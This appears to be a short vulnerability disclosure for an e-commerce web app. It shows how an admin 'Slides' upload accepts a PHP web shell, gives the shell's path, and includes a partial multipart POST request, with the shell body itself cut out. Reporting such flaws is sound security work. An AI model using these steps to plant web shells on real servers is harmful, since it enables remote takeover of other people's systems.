...
* `Description` => Upload web shell at `Slides` in admin panel
# Step to Reproduct
Login to admin -> `Slides` -> upload web shell -> `Submit`
# Exploit
* Upload web shell at `Slides`
![image](https://user-images.githubusercontent.com/79050415/158144322-ebb32761-36ec-4d21-b48d-da6b3d38b65f.png)
* When upload success access `/Codes/kresources/uploads/shell.php`
![image](https://user-images.githubusercontent.com/79050415/158145128-2e23811d-0cf9-46e6-b66d-338ae6e37e6b.png)
* Web shell active
![image](https://user-images.githubusercontent.com/79050415/158146280-04acac52-3369-4ff3-af75-98e584ac746a.png)
# Vulnerable Code
![image](https://user-images.githubusercontent.com/79050415/158146443-600acc11-64df-41fa-9208-6d018225908f.png)
...
* `Request`
```c
POST /Full-Ecommece-Website/Codes/public/admin/index.php?slides HTTP/1.1
Host: localhost:8080
...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryape0IuRDSCQO1Rna
...
Referer: http://localhost:8080/Full-Ecommece-Website/Codes/public/admin/index.php?slides
...
?>
------WebKitFormBoundaryape0IuRDSCQO1Rna
Content-Disposition: form-data; name="slide_title"
